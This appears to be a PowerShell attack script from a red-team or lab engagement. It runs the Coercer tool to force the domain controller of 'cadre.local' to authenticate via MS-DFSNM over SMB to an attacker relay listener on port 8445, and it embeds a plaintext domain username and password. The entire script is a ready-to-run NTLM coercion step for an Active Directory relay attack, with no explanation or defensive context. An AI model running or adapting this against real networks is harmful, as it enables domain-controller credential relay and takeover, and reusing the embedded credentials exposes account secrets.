# Coerce dc01$ via MS-DFSNM (SMB-based) to relay on provisioning .60:8445
$ErrorActionPreference = "Continue"
$env:PYTHONIOENCODING = "utf-8"
$env:PYTHONUTF8 = "1"
& "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce `
  -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 `
  -t 192.168.77.10 -l 192.168.77.60 --smb-port 8445 `
  --filter-protocol-name MS-DFSNM --auth-type smb --always-continue 2>&1 | Select-Object -Last 20
Write-Output "coerce_rc=$LASTEXITCODE"
Write-Output "=== COERCE_DONE ==="
